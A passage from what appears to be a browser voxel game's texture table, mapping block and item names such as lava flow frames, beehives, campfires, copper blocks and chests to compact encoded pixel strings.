    "lavaFlow25": "0g0gv0YwY(ZZOWHWZHHHWYHZyZSZWWgYYYW>WiYW>WZZHY0QNkpT80M_xRyxyj7a|NgXwo8RRrNc2}kRp^6gP_x01XF(Xg%gIyT(X(IDh5083({&Xx8}8x82l4-O0lmDT",
    "lavaFlow26": "0g0gv0YwY(ZZOWHWZHHHWYHZyZSZWWgYYYW>WiYW>WZZHY0QNkpT80M_xRyxyj7a|NgXwo8RRrNc2}kRp^6gP_x01XF(Xg%gIyT(X(IDh5083({&Xx8}8x82l4-O0lmDT",
    "lavaFlow27": "0g0gv0YwY(ZZOWHWZHHHWYHZyZSZWWgYYYW>WiYW>WZZHY0QNkpT80M_xRyxyj7a|NgXwo8RRrNc2}kRp^6gP_x01XF(Xg%gIyT(X(IDh5083({&Xx8}8x82l4-O0lmDT",
    "lavaFlow28": "0g0gx0YgYWWHH(ZZHWwYHYBZWyZiYZZOWSZWWYY>W>WH2YYYHZ0ggo6o^00[$AX41003%iaPN@pA]@AR09?VkNEog1U49o6og1lVQo>]X1oi[w*MS14215Vrg1o080U?>o06SS2]xE{AJFS@g1F@hg9]g14180VogKSE?E20EKEE0",
    "lavaFlow29": "0g0gx0YgYWWHH(ZZHWwYHYBZWyZiYZZOWSZWWYY>W>WH2YYYHZ0ggo6o^00[$AX41003%iaPN@pA]@AR09?VkNEog1U49o6og1lVQo>]X1oi[w*MS14215Vrg1o080U?>o06SS2]xE{AJFS@g1F@hg9]g14180VogKSE?E20EKEE0",
    "lavaFlow30": "0g0gx0YgYWWHH(ZZHWwYHYBZWyZiYZZOWSZWWYY>W>WH2YYYHZ0ggo6o^00[$AX41003%iaPN@pA]@AR09?VkNEog1U49o6og1lVQo>]X1oi[w*MS14215Vrg1o080U?>o06SS2]xE{AJFS@g1F@hg9]g14180VogKSE?E20EKEE0",
    "lavaFlow31": "0g0gx0YgYWWHH(ZZHWwYHYBZWyZiYZZOWSZWWYY>W>WH2YYYHZ0ggo6o^00[$AX41003%iaPN@pA]@AR09?VkNEog1U49o6og1lVQo>]X1oi[w*MS14215Vrg1o080U?>o06SS2]xE{AJFS@g1F@hg9]g14180VogKSE?E20EKEE0",
    "lavaFlow32": "0g0gswY(ZWSZ0YYgYWHHYZWZ>WHWY2YYOWWHWHyZZ>W0Q(pRMX6weAalwx<yPC18G|3<og-0m18*P004ocXocboSA#9%?nIwM3y.824/4w]R2g30241S8Kb/E1IKod{S510g-g0#",
    "lavaFlow33": "0g0gswY(ZWSZ0YYgYWHHYZWZ>WHWY2YYOWWHWHyZZ>W0Q(pRMX6weAalwx<yPC18G|3<og-0m18*P004ocXocboSA#9%?nIwM3y.824/4w]R2g30241S8Kb/E1IKod{S510g-g0#",
    "lavaFlow34": "0g0gswY(ZWSZ0YYgYWHHYZWZ>WHWY2YYOWWHWHyZZ>W0Q(pRMX6weAalwx<yPC18G|3<og-0m18*P004ocXocboSA#9%?nIwM3y.824/4w]R2g30241S8Kb/E1IKod{S510g-g0#",
    "lavaFlow35": "0g0gswY(ZWSZ0YYgYWHHYZWZ>WHWY2YYOWWHWHyZZ>W0Q(pRMX6weAalwx<yPC18G|3<og-0m18*P004ocXocboSA#9%?nIwM3y.824/4w]R2g30241S8Kb/E1IKod{S510g-g0#",
    "lavaFlow36": "0g0gtwY0YgY(ZSZOWZyZZWHWHWWWHYiYZH>WY>W2YWYHH0SwMcI0MzqK9o*wq?0gpq4c*oRM-4Nd(02S4FRw09QRP6ohVM8MN?0o(dJXwi44T60dac42w#rmfww1?SQ<Xwe",
    "lavaFlow37": "0g0gtwY0YgY(ZSZOWZyZZWHWHWWWHYiYZH>WY>W2YWYHH0SwMcI0MzqK9o*wq?0gpq4c*oRM-4Nd(02S4FRw09QRP6ohVM8MN?0o(dJXwi44T60dac42w#rmfww1?SQ<Xwe",
    "lavaFlow38": "0g0gtwY0YgY(ZSZOWZyZZWHWHWWWHYiYZH>WY>W2YWYHH0SwMcI0MzqK9o*wq?0gpq4c*oRM-4Nd(02S4FRw09QRP6ohVM8MN?0o(dJXwi44T60dac42w#rmfww1?SQ<Xwe",
    "lavaFlow39": "0g0gtwY0YgY(ZSZOWZyZZWHWHWWWHYiYZH>WY>W2YWYHH0SwMcI0MzqK9o*wq?0gpq4c*oRM-4Nd(02S4FRw09QRP6ohVM8MN?0o(dJXwi44T60dac42w#rmfww1?SQ<Xwe",
    "lavaFlow40": "0g0gpZ0YSZ(ZWZHHgYYwY2Y>WWYWHWZYiY>WyZOWW0RxMX0_R0RRM3p6tb}]?uzSI}{?^^22JMXXOS@MdA5x]hkEE0,$hz5C|bQqgxF;:%a)jmF^iBw!wT5R084]c-q2c",
    "lavaFlow41": "0g0gpZ0YSZ(ZWZHHgYYwY2Y>WWYWHWZYiY>WyZOWW0RxMX0_R0RRM3p6tb}]?uzSI}{?^^22JMXXOS@MdA5x]hkEE0,$hz5C|bQqgxF;:%a)jmF^iBw!wT5R084]c-q2c",
    "lavaFlow42": "0g0gpZ0YSZ(ZWZHHgYYwY2Y>WWYWHWZYiY>WyZOWW0RxMX0_R0RRM3p6tb}]?uzSI}{?^^22JMXXOS@MdA5x]hkEE0,$hz5C|bQqgxF;:%a)jmF^iBw!wT5R084]c-q2c",
    "lavaFlow43": "0g0gpZ0YSZ(ZWZHHgYYwY2Y>WWYWHWZYiY>WyZOWW0RxMX0_R0RRM3p6tb}]?uzSI}{?^^22JMXXOS@MdA5x]hkEE0,$hz5C|bQqgxF;:%a)jmF^iBw!wT5R084]c-q2c",
    "lavaFlow44": "0g0gmHZZwYWW(ZgY0YSZWW>WHWiYYH>WyZY2Y0RwMB?^gpiOpqe&0EC-NRqJoaC/24TRRpF2K4p!{OE)(ox9KlTNa{MS/SFgcqU%21xRs9XAick",
    "lavaFlow45": "0g0gmHZZwYWW(ZgY0YSZWW>WHWiYYH>WyZY2Y0RwMB?^gpiOpqe&0EC-NRqJoaC/24TRRpF2K4p!{OE)(ox9KlTNa{MS/SFgcqU%21xRs9XAick",
    "lavaFlow46": "0g0gmHZZwYWW(ZgY0YSZWW>WHWiYYH>WyZY2Y0RwMB?^gpiOpqe&0EC-NRqJoaC/24TRRpF2K4p!{OE)(ox9KlTNa{MS/SFgcqU%21xRs9XAick",
    "lavaFlow47": "0g0gmHZZwYWW(ZgY0YSZWW>WHWiYYH>WyZY2Y0RwMB?^gpiOpqe&0EC-NRqJoaC/24TRRpF2K4p!{OE)(ox9KlTNa{MS/SFgcqU%21xRs9XAick",
    "lavaFlow48": "0g0goYWH(ZwY0Y2YZYHZSZWWgYWyZiYH>WWOW>WZ0Qh9a^Bp^S^RFj?x[>6?(y>EA>}kRKb}zPa2RgDo(UM(J.bmMo&g(~rqn5Lbq8rMXRQ@0Fg;gw7mRh]M",
    "lavaFlow49": "0g0goYWH(ZwY0Y2YZYHZSZWWgYWyZiYH>WWOW>WZ0Qh9a^Bp^S^RFj?x[>6?(y>EA>}kRKb}zPa2RgDo(UM(J.bmMo&g(~rqn5Lbq8rMXRQ@0Fg;gw7mRh]M",
    "lavaFlow50": "0g0goYWH(ZwY0Y2YZYHZSZWWgYWyZiYH>WWOW>WZ0Qh9a^Bp^S^RFj?x[>6?(y>EA>}kRKb}zPa2RgDo(UM(J.bmMo&g(~rqn5Lbq8rMXRQ@0Fg;gw7mRh]M",
    "lavaFlow51": "0g0goYWH(ZwY0Y2YZYHZSZWWgYWyZiYH>WWOW>WZ0Qh9a^Bp^S^RFj?x[>6?(y>EA>}kRKb}zPa2RgDo(UM(J.bmMo&g(~rqn5Lbq8rMXRQ@0Fg;gw7mRh]M",
    "lavaFlow52": "0g0grWWHHgY(ZSZwY0YHYOWZWWYW>WyZZYiYZ>WZY2Y0QxMX]Ui9$_a&/g>4Fg21k/8aBxX.^-Qx}{?-k85SyRk,]#z32X:20%b7AF8FUT3*l;gtsI",
    "lavaFlow53": "0g0grWWHHgY(ZSZwY0YHYOWZWWYW>WyZZYiYZ>WZY2Y0QxMX]Ui9$_a&/g>4Fg21k/8aBxX.^-Qx}{?-k85SyRk,]#z32X:20%b7AF8FUT3*l;gtsI",
    "lavaFlow54": "0g0grWWHHgY(ZSZwY0YHYOWZWWYW>WyZZYiYZ>WZY2Y0QxMX]Ui9$_a&/g>4Fg21k/8aBxX.^-Qx}{?-k85SyRk,]#z32X:20%b7AF8FUT3*l;gtsI",
    "lavaFlow55": "0g0grWWHHgY(ZSZwY0YHYOWZWWYW>WyZZYiYZ>WZY2Y0QxMX]Ui9$_a&/g>4Fg21k/8aBxX.^-Qx}{?-k85SyRk,]#z32X:20%b7AF8FUT3*l;gtsI",
    "lavaFlow56": "0g0gvwYWZYWSZyZY(ZgY0YHYHWZZHWH2Y>WWiY>WHZWHWY0QN0M!!18Ek*9uQCbUA02J5RU.Sk8w02|h/&S09*80gc(y$1z=3FD4Xy8i&01G1#00FSXf3A82e1>BRgzC.fRUyQ[uSxMAx",
    "lavaFlow57": "0g0gvwYWZYWSZyZY(ZgY0YHYHWZZHWH2Y>WWiY>WHZWHWY0QN0M!!18Ek*9uQCbUA02J5RU.Sk8w02|h/&S09*80gc(y$1z=3FD4Xy8i&01G1#00FSXf3A82e1>BRgzC.fRUyQ[uSxMAx",
    "lavaFlow58": "0g0gvwYWZYWSZyZY(ZgY0YHYHWZZHWH2Y>WWiY>WHZWHWY0QN0M!!18Ek*9uQCbUA02J5RU.Sk8w02|h/&S09*80gc(y$1z=3FD4Xy8i&01G1#00FSXf3A82e1>BRgzC.fRUyQ[uSxMAx",
    "lavaFlow59": "0g0gvwYWZYWSZyZY(ZgY0YHYHWZZHWH2Y>WWiY>WHZWHWY0QN0M!!18Ek*9uQCbUA02J5RU.Sk8w02|h/&S09*80gc(y$1z=3FD4Xy8i&01G1#00FSXf3A82e1>BRgzC.fRUyQ[uSxMAx",
    "lavaFlow60": "0g0gxY(ZZHwYSZH>W>WYgYWHZHWY0YHWZWiYOWHyZWYY2YZBYZ0ggT@sQEigd-S~t0QRgJ;STkSgSk5k{Q%NERhk^X4gFkQ{khk4QRUTERKQU?ksxgUkCkQQlgT;i|QgkE8,hkQST?igDg%gREjQgUdVU.S~4Qhg_8Xk5t",
    "lavaFlow61": "0g0gxY(ZZHwYSZH>W>WYgYWHZHWY0YHWZWiYOWHyZWYY2YZBYZ0ggT@sQEigd-S~t0QRgJ;STkSgSk5k{Q%NERhk^X4gFkQ{khk4QRUTERKQU?ksxgUkCkQQlgT;i|QgkE8,hkQST?igDg%gREjQgUdVU.S~4Qhg_8Xk5t",
    "lavaFlow62": "0g0gxY(ZZHwYSZH>W>WYgYWHZHWY0YHWZWiYOWHyZWYY2YZBYZ0ggT@sQEigd-S~t0QRgJ;STkSgSk5k{Q%NERhk^X4gFkQ{khk4QRUTERKQU?ksxgUkCkQQlgT;i|QgkE8,hkQST?igDg%gREjQgUdVU.S~4Qhg_8Xk5t",
    "lavaFlow63": "0g0gxY(ZZHwYSZH>W>WYgYWHZHWY0YHWZWiYOWHyZWYY2YZBYZ0ggT@sQEigd-S~t0QRgJ;STkSgSk5k{Q%NERhk^X4gFkQ{khk4QRUTERKQU?ksxgUkCkQQlgT;i|QgkE8,hkQST?igDg%gREjQgUdVU.S~4Qhg_8Xk5t",
    
    barrelTopOpen: "0g0g8HZWNY>WQW-Z$Y5A?A}]I[xN:GyZZZZ}ZZTyZZZZZZZZZZ}ZZTxZZ:Gy[y&@p5A?A",
    barrelBottom: "0g0g6HZUZ>WNYH02P0PFt$J]00o!PiQ&4Apk$iki{AaFAJPhe0AJ)J?)01AJFBkJPgcJ{0ScQa4040",
    barrelSide: "0g0gaWZNYUZHQY(YEZH>W10101010i1i1i1i1j1>1R1>4VVVGGGGGGG>]]]]ih>h2h3Tp1i19k9Ti4p1P4jhj8p1>4jhj]>hj8ihVGGGGGGG>]]]]Rki1Rki1>QRQ>Q>Q",
    barrelTop: "0g0g7HZWNY>WYY5A?A}]IS9A9xN29AxyyP]yh]y{h]wJ]i]Ai]A|0ATwkAy4iAxyS9A9y&@p5A?A",
    
    chainSW: "0g0g4000AZ<lWP@Hr5i4w]C9Kmx8gXB0000000000000000000000000000000000000000",
    endStoneBricks: "0g0g8YWYZHH.HH4JCQJJJA},|)vZZZ0AcA|IJA|kJPAcJ)~mHZZZ4J1A",
    
    beeNestTop: "0g0g5RYH)HkHGH0]0i09A|Aa]Pha2S4halAJy!pAJTg%p1yTha9cTha9c@y!91yzg%pAJzh!lAzha2PAaPkPg9AP0i0A21",
    beeNestSide: "0g0gbGH)HWkHHRYnHWZ6H>Y0h0001h01hg01hhgyyxhyNyz?VUQVQQVhg01hhhhyhhhyyhiONyyzNxzVUQ?VVVVyyyyyyzONCyOOOOOOOOVVVVVVVVOOOOO,GO-IGGGGIIIIII",
    beeNestFrontHoney: "0g0gh)HGHkHW>YzWNZHMHH6HYYWZZRYZ00gXx8Rh8x000Xx02wXToM0oMxagXx8o82g000{Xo0000o>gXxRg(Rx]RXxe%oM006)>oXx0005gXx8RgXx8RFa;x8RgXXRjQ8RJF9^T^x)Xx8RgX",
    beeNestFront: "0g0gd)HGHkHW>YzWNZHY6HWRYZ01hhhhyh00hh0ihxOO(0OzONQVQQQ?gh001I(000OVyyOyyQy?QUQQyOO(00/zNyO0000OyyyyyyyyUUQQQQIy!!yyVUR[!QQQQQ",
    beeNestBottom: "0g0g5>YHZ6HW0]0i09A|Aa]Pha2S4halAJy!pAJTg%p1yTha9cTha9c@y!91yzg%pAJzh!lAzha2PAaPkPg9AP0i0A21",
    beehiveSide: "0g0g8VZWY*HRZHHEY4JPAJ]T00+S+12J%JAAJPAAJPAC50;K0A4J}AJ?000qdJJ",
    beehiveFrontHoney: "0g0gdVZWW*HRZHY(YZkZEYZ*ZZZ1hhhhhhgwO(003O2w3O00O02QUQVQVQQ@IGRyyyyyDA2OOO(59O00h900hh5RAhiGxh4hhphhl^03.703(0N3OO*QUVQQV?Q",
    beehiveFront: "0g0g8VZWW*HRZHkZEY4JPAJ]T00+S+12J%JAAJPAAJPAC50<K0A5JiQJ}AJ|000qdJJ",
    beehiveEnd: "0g0g5VZW*HkZW4JPAJ]FwS0F4001w410Fw00A1N,zpw9AJTEC00hE0000%A0PAN+wJ]0JTE0j0h%0]0pF)0044JPAJ]",
    
    honeycomb:"0g0g6000HYMHYY00900000w0002Q00i!00S6S6+DS502S0$},S2,S200U00b000500000000",
    honeycombBlock: "0g0g6W(YZ*ZZYZZ5+5KE$]]]!SS2$]${QCAA5Q5N$R$@SQ]0!]!0S$]c{5A1DA,A",
    honeyBlockTop: "0g0g6KZ3Z*LI0J]J45A!KXAXwQJJ]4?AK00yFS00]!]0JR^S4Ji1xA^0PFA2^QRj4QP12Q|px2m{c",
    honeyBlockSide: "0g0g6Z3ILZ*K0kXP4g0y,zXiNcX40%4]?056]]kpxgTw3xyP40XJ%)i]1z@JRiAw0{x0",
    honeyBlockBottom: "0g0g5Z3wKwK02T994|A)%A+9FAJ+dACd@+3|J)3dRPAR0|+2j8C0JwXJS4Aw3C",
    
    glowLichen: "0g0g6000]HnZYZZ5(04e(0c91g0(gxo0C000UKk0002S0jc0s04l0KC0120Q-190w410K0c030Sz4>14K0",
    inkSac: "0g0ga000)WZ-WP4Y-HWWoWVH00000000000000000000000000000hg000001zx000000iT000001?0000hm000hG001GQ001]0000o00000I000000000000000000000000000",
    glowInkSac: "0g0gc000l?WZ-WoWlH&Y/WWhZNW_Y00000000000000000000000000000hg000001zx000000ik000001k0000hmk000hGS001GS004k0000QrS00000QS000000000000000000000000000",
    glowItemFrameIcon: "0g0gl000AJHY8HWWyYZZiYBWWYbYZZZZ]WZYnY)YHNY0000000000000000000000001800000x8>gx0F^0t8^eFK0:g0MK0=|K0=}u0NK4:oFK4Qt9Rf^hK1kRE8RFK1VK0000000000",
    glowItemFrameWood: "0g0g78HYEZGHHHCW4AJ9A080Aw2cJi3aAP2KwoX1_0jA92PAX40czSAA4A4PQiA9cgPNg0AG",
    glowItemFrame: "0g0gfEJW(Y)ZAW2YiYyYNYZZYZ]WZYZH)Y1iyyxhhjkQQQ?U?TmVV[BIIABTCCCkRlllIIGlU[VTkQ@?1uhhyyyg",
    coarseDirt: "0g0g)lZYYYY2Z(HSZzWHOHXWHYW{HQZUYY>YYHUH]WZ;YQW-Y>HVVH>YH5YjWXWOHUYZW>HiZQWWlYHWZjH)Y{WYoH0gc11kMs20ci^cdc13-j|08w>A34h4d(c>h>5d>dTcm*kNI0(0,EgX(8}E6P>c(TecO[cq>u>>c(1sgS11{>3(4?p)d>DA->ed*(Tnbnc44;SkKwsT4Ngg|M",
    
    oxidizedCutCopper: "0g0g8pZW<HY}H*WYW42a0RdBe]dBdfHtf,r:,/hy&@N.yVV0R02aq{i|qeqd%.%phBMNNB#VP#",
    oxidizedCopper: "0g0g8pZW}WY=6Y}H.Y.H0g8024A4E6Fv9|dPB5PB)5k|4%i5iA9B/d{$VM+n9:Z",
    weatheredCutCopper: "0g0g8YHH*HnWVZHPH02a40R%Gi.De_h!qf,r::qr|,D+ZH0R40^O.y+d!NlNm+:vnv/yODLPL",
    weatheredCopper: "0g0g8YHHVZnW*HHPH0g]029+P8^eRmJa|9i#L8JJ.L4P0|A5DzQ9A9?Acxm^rm/Z",
    exposedCutCopper: "0g0g8-W7HH+YWWWY42^42Mm!OCsge&m&m?6&]+LM_B0R0g^m^hmM^LamuCNe?M!!F%%J",
    exposedCopper: "0g0g8-W7HWW+YHHY0g]02^dpg=^hOeJAd_UdNd9OrVi9cReQlj%Bk/lxacMB+",
    cutCopper: "0g0g66ZYWXHH>Y42a4R&1tFIg8c@gQi)e*2M5%2d2%-B%SyVV0R4^M2(8d-yw@J9ly)&0M(6d5w,y%-B#VP#",
    wetSponge: "0g0g4)YZOHH6h>T:lldY7nTQ[p#,Xl?3",
    sponge: "0g0g5)YOYZZW0i8CQA2$4SliCQJx0^@3F824144000CC0RK+RS2RNJw0i9CX0?0hg?08D2]4wwpi4!0iN]",
    
    quartzBricks: "0g0g6ZYHZWY0000019AdJP%AQJP+?%J{dJPJ{dJA_0S0T%SJPPAJPPBJPJBJPUA%",
    
    campfire: "0g0gh000WWY*HY{HZZYWVZ)YkZyYWHWY00000000000000080000000018S00000002gS00000043g0000004>o000000Iwg00001cXF6w0000KI.4j000cX[-E01DES1S1p.S17.o<S2F^FS0000000000",
    campfireLogLit:"0g0g100W",
    campfireLog: "0g0gfWHYyY{HVZW000WkZ$WsYoZ.BZVY0gy1gywgjQOg11)T2x11OM10Qhw0hhQQGGGGGGGGGGGGGGGGGGGGGGGG",
    campfireFire:"0g0g100W",
    campfireFire0: "0g0g8000WYW*HYYZZY00^w0000Q0000X0000I0006]006V0002Vg00400r|R0#J1i01(01+00.+C01S0WZ^S",
    campfireFire1: "0g0g8000WYWY*HYZZY008w0000K0000Q0000^x000iB(000PC000CS02S0m00N0000m00*01S1GSeYZ",
    campfireFire2: "0g0g8000WY*HWYYZZY00000001K00004w000bC0000Bg001!J009V00300o00j#003!00j00]00CR02+E01<YS",
    campfireFire3: "0g0g8000WWYYY*HZZY00100000010000gT0000h8000004Gg00#00zk002N000S04S0z00t00Ai02)02WU0",
    campfireFire4: "0g0g8000WWYY*HYZZY000000000000019w000aP000g00k00p005BA000-01BJS0200400l00n)00G01PYZS",
    campfireFire5: "0g0g8000WWY*HYYZZY00000000180002%w000b|002000k00ki00200a004000g002g002004J00lG00WZS",
    campfireFire6: "0g0g8000WYW*HYYZZY000000000400098006B006U|006U$C00+B00)U?000|]000006002g00/J00l00r,00.H0",
    campfireFire7: "0g0g8000WYW*HYYZZY0004000aA000^S0000w0006{{g000Q(006B002U000t+00+tm00-C00lm01(00O(00<Lg01H0",
    campfireLogLit0: "0g0gkWHYyY{HoZsYAHNZWY*H$ZwJZ-HgH$W.BZVYY0218184x0w8Tw0Sh0Xi1Mg40x2jB@X0qJwa^BPA2w>xB[:@Pm5cX^kqCXpB_Jg@(yX^^6X{#k-doQ)BoqCX@6X8g",
    campfireLogLit1: "0g0gkWHYyY{HoZsYAHWY*H$ZwJZNZgH$W-H.BZVYY0218184x0w8Tw0Sh0Xi1Mg40x2jB@PX0osJEwa^BPA2>qxB[:i6]^k!Rk+CpxyfB!i?@^RUX+6|8]^jmnOnC?",
    campfireLogLit2: "0g0gkWHYyY{HoZsYAHW*H$ZwJZYNZgH$W-H.BZVYY0218184x0w8Tw0Sh0Xi1Mg40x2jxCTX0mgwa^BPA3i(Rt0xB7/@P>i6$^BkRCpMji*MF@f@{R*{>hmnOnC?",
    campfireLogLit3: "0g0gkWHYyY{HoZsYAHWYNZ*H$ZwJZgH$W-H.BZVYY0218184x0w8Tw0Sh0Xi1Mg40x2jB6X0qiEwa^$2k$_0xB[:@]Rl5xBlqCpBjXT%Om@L@_Rx{]loonOnC?",
		campfireCombined:["0g0g100W","0g0g100W","0g0g100W"],
    
    soulCampfire: "0g0gi000iYa.WDsZYHHZZ{HZZZWVZ)YkZyYWHWY0000000000000008000000001800000003oS00000084o0000004w0000014F2w00000M]g0000cT@z00eAS01EE(%K1.k*K1K1nfK2K0000000000",
    soulCampfireLogLit:"0g0g100W",
    soulCampfireLog:"0g0gfWHYyY{HVZW000WkZ$WsYoZ.BZVY0gy1gywgjQOg11)T2x11OM10Qhw0hhQQGGGGGGGGGGGGGGGGGGGGGGGG",
    soulCampfireFire:"0g0g100W",
    soulCampfireLogLit0: "0g0gkWHYyY{HoZsYAHmPHCZYHH$ZwJZdYgH$W.BZVYZZ0218184x0w8Tw0Sh0Xi1Mg40x2jB@X0qJwa^BPA2w>xB[:@Pm5cX^kqCXpB_Jg@(yX^^6X{#k-doQ)BoqCX@6X8g",
    soulCampfireLogLit1: "0g0gkWHYyY{HoZsYAHCZYHH$ZwJZmPHgH$WdY.BZVYZZ0218184x0w8Tw0Sh0Xi1Mg40x2jB@PX0osJEwa^BPA2>qxB[:i6]^k!Rk+CpxyfB!i?@^RUX+6|8]^jmnOnC?",
    soulCampfireLogLit2: "0g0gkWHYyY{HoZsYAHCZHH$ZwJZYmPHgH$WdY.BZVYZZ0218184x0w8Tw0Sh0Xi1Mg40x2jxCTX0mgwa^BPA3i(Rt0xB7/@P>i6$^BkRCpMji*MF@f@{R*{>hmnOnC?",
    soulCampfireLogLit3: "0g0gkWHYyY{HoZsYAHCZYmPHHH$ZwJZgH$WdY.BZVYZZ0218184x0w8Tw0Sh0Xi1Mg40x2jB6X0qiEwa^$2k$_0xB[:@]Rl5xBlqCpBjXT%Om@L@_Rx{]loonOnC?",
    soulCampfireFire0: "0g0g8000iWzcHa.WHHYZZZZZ00^w0000Q0000X0000I0006]006V0002Vg00400r|R0#J1i01(01+00.+C01S0WZ^S",
    soulCampfireFire1: "0g0g8000a.WzcHiWYHHZZZZZ008w0000K0000Q0000^x000iB(000PC000CS02S0m00N0000m00*01S1GSeYZ",
    soulCampfireFire2: "0g0g8000a.WYHHiWzcHZZZZZ00000001K00004w000bC0000Bg001!J009V00300o00j#003!00j00]00CR02+E01<YS",
    soulCampfireFire3: "0g0g8000iWa.WzcHZZYHHZZZ00100000010000gT0000h8000004Gg00#00zk002N000S04S0z00t00Ai02)02WU0",
    soulCampfireFire4: "0g0g8000a.WiWzcHYHHZZZZZ000000000000019w000aP000g00k00p005BA000-01BJS0200400l00n)00G01PYZS",
    soulCampfireFire5: "0g0g8000a.WiWzcHHHYZZZZZ00000000180002%w000b|002000k00ki00200a004000g002g002004J00lG00WZS",
    soulCampfireFire6: "0g0g8000iWzcHa.WHHYZZZZZ000000000400098006B006U|006U$C00+B00)U?000|]000006002g00/J00l00r,00.H0",
    soulCampfireFire7: "0g0g8000iWzcHa.WHHZZYZZZ0004000aA000^S0000w0006{{g000Q(006B002U000t+00+tm00-C00lm01(00O(00<Lg01H0",
		soulCampfireCombined:["0g0g100W","0g0g100W","0g0g100W"],

		bamboo:"0g0gb0001WHyH?HWmW<ZWRWZ00000000000000hw000001NS00000jA000005NS00000j000001y0000zA0/0002NS09000A000002+S00000yA000002N000007D000000700000000000000",
		bambooStage0:"0g0gf000.Z}ZH.W*HUZQW?HZ)Z)WY?HV1Z000000000000000000010000000200000003S0000005w000000m000000D000000]0000000000000000090000090000bK0000a0000a00",
    bambooStalk:[
    	"0g0g8SW0Y?ZH4Z?HW<H4T$0BXh00n$4090A1#A604)Z00A?_1wg00T00k040WQg0A6aN0A9W0g140S0g0E9x0",
    	"0g0g5000RWZH1W0000005g0000100000O000006000000000000000000000000000000000000000000000000000000000000000000000",
    	"0g0g6000*H%hHxYH?H0gN02M@m[#%ihh6cNd30R@pK6@Po.!0pEa0m+Kl2i-0g#5qS9epF(k,1E008g",
    	"0g0g7000HxY%hHEH?H*H00000065qS0Mr5g01w00q00012IK0004g2@00/cM10K038!00cpQ00c2?g000580000k00000000"
		],
    
    chest: [
			/*front*/"0g0gA(HQWSZ000EZZZHHZZWYUHJYWW1HHZsH)H$ZWYQYyHZHHTZMZQZZwHAZ0gT4g4g8ggk9skgg$|($ggS|P)gSg0lVVV0w0lVVV0whgh=0hM[s?E?kgh1@EsEwgsE[sgho$&0hMEk?kgikT)|)g{gI]gT4TmgSc(c(c(c(",
    	/*side*/"0g0gssH(H)H)HSZ000EZJYWWZQWZWZHZwHAZ$ZZHQZHWYRYZ0Rx8TgXxMXPJOqoO.x8$aR$oOo*kPJN8Rgs$*MMgNRf8gNs$*8+MM$0Rx8TgXxF^F^",
    	/*top*/"0g0ghEZ)H-H(H000)HZWZJYZZHHZWW0QgIx8R(XFwTkX!kkXbXX!%oXpMX!k%^ocXcu4X!oFkXpFoXFFXb.4XF.cX0NF^Xx8RgXx8RgXx8RgXx8RgX",
    	/*bottom*/"0g0ghEZ)H-H(H000)HZWZJYZZHHZWW0QgIx8R(XFwTkX!kkXbXX!%oXpMX!k%^ocXcu4X!oFkXpFoXFFXb.4XF.cX0NF^Xx8RgXx8RgXx8RgXx8RgX",
    	/*handle*/"0g0g7000;ZHHJPWoHcW5k0000,0000+000000]S000000000000000000000000000000000000000000000000000000000000000000000"
		],
    
    boneMeal: "0g0g7000ZYZZZY?mHZ0000000200000k]0g00mw00@/00*S0|S0JE0+5{E0S5PS2S01VS00%a0000000",
    
    clay: "0g0g6HWZHWZ5*y]9dN$JPaQPdJxPR9ykAh+A1{]likyNUEyclA$",
    clayBall: "0g0g9000TlYWWH)HHZZ000000000000000000000000000hh000001zyg0000k)NB0001+,001O@O00j[REB00kO)OEB00iO-y001OyE000VyV00000VV0000000000000000000",
    brick:"0g0g8000]YjWWZXH$WKW00000000000000000001B-002^04*U!CFPCF#UJP=MDAJ~6DA00=000j000000000000000",
    
    charcoal: "0g0ga000sHEZSZ(WgSZY|jHUWwY000000000001h000001zR0000UB0005>N005M]005xk-).0phyPh0hhhJ0yFhJN0JpF0FyJh05ixhl000hlV0005V00000000000",

    christmasChest: [
			"0g0gCYYZY000WWWzZWHYYWWWZJWZZHYgWWwWwHwH(HYwHwHYKgWwHWWgW]0W{0W0gT4g4gT4g0T@gTgT8Ag0?kk?wg0c)k|-Th?kPx?|STh?kPx?|SVVVVVVVVVVoVtoVVVtVVVVVtgt+zgoKwgJBc(c(c(c(",
    	"0g0gCYYZY000WWWzZWHYYWWWZJWZZHYgWWwWwHwH(HYwHwHYKgWwHWWgW]0W{0W0gT4g4gT4g0T@gTgT8Ag0?kk?wg0c)k|-Th?kPx?|STh?kPx?|SVVVVVVVVVVoVtoVVVtVVVVVtgt+zgoKwgJBc(c(c(c(",
    	"0g0gpZZYZYW000ZWWYjZWWjZWzZYYHzZQW3Y>Z3YH0Rh8gXgX9x!T4ao4hXwRg4$X-J,*A|URgx8sM%oSMM9XxRgX9.40>oT-Xx0F^F^F^F^",
    	"0g0g7SZSZSZ000wHwHwH4JPAJN)]NP)J]NAJNPA]N|J]NJ]NA]NPAJ]NP]+P%J^NA^NPAJ4JPAJr",
    	"0g0g5000OZZYWY40000%000%J000AJ0000000000000000000000000000000000000000000000000000000000000000000000000"
		],
    
    appleCore: "0g0gg000WZUYTHYTZHYZZZ9ZDYHZUwZ00000000000010000000z0000000g000004TMg00005[000000V0000000000009000000b000000d000000000000000004@S0000fhv0000000000",
    
    tintedGlass: "0g0g5)ENEAJPk029FgSdzdrde@N+h%%|%%x|o%d@0AS",
    light_15: "0g0g8000HQZZYZZZHW]Y52^000B2@052^J]50aJPoA^JPw00AJPw00sJPo004.0000+0000h0000d0000m0000r0000nK000030000000",
    
    tomatoPlantStage0: "0g0g5000OHqZ9HuhZ000000000000000000000000000000000000000000000000000400000400020w0000R%006Q00000k00000kc0000200",
    tomatoPlantStage1: "0g0g6000OHFY!YqZuhZ000000000000000000000000000400008ww0003100004g000J000000200000Q0005500000B00000B00000400",
    tomatoPlantStage2: "0g0g8000OHYWWyWqZuhZFY0000000004000w0w001)0w000wSg0000E00050053403000s1?000f00000&0000f00000500",
    tomatoPlantStage3: "0g0g8000HZFYqZuhZWW00000050o0Cs0054(0200rAN4o1A^0J2^o(o1A00c00006B1000B0000600000A00",
    tomatoPlantStage4: "0g0g6000HZFYqZuhZ00000050o0Cs0054(02000NE4CA^m0J2^o(o1A00c00006B1000B0000600000A00",
    tomato: "0g0ga000q(Wq0WJHZZYZVHZ00100000000i00000001hw00001hxh0000iMAig000]XR003G00O00,00,00,G00OG003G003,0003G0000000000",
    tomatoSeeds: "0g0g3000YZ00000g0000o00000oSg40S00040000gS40g0040000001000010010400000000",
    
    newCactusFruit: "0g0g6000HVHWRHBWPY00000000000000000000000000000000000000000000000000000000000000aK00000000000000000000a00",
    greenCactusFruit: "0g0g6000HVHWRHBWPY00000000000000000000000000000000a00000002S00300i00i00i002S00300000000a00",
